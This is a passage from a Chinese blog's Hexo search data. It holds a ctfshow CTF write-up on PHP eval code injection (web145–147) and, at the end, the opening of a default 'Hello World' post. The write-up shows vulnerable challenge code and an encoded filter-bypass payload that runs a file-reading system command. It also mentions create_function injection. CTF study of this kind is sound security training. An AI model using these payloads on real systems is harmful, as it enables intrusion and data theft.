punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次似乎把所有的运算符都过滤了，我们该怎么办呢？可以使用三目运算符，因为？没有被过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">?</span>phpinfo<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payload为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">9</span>C<span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分号被过滤，我们可以使用逻辑运算符进行组合，比如</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return 1==phpinfo()||1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有一说一，挺离谱的。啥原理</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点：什么特殊符号添加在函数名头部或者尾部，不会影响函数的调用。此外还有create_function的代码注入。详细可见</p><p>一开始硬是没看懂。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web安全 </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/10/21/hello-world/"/>
      <url>/2021/10/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" 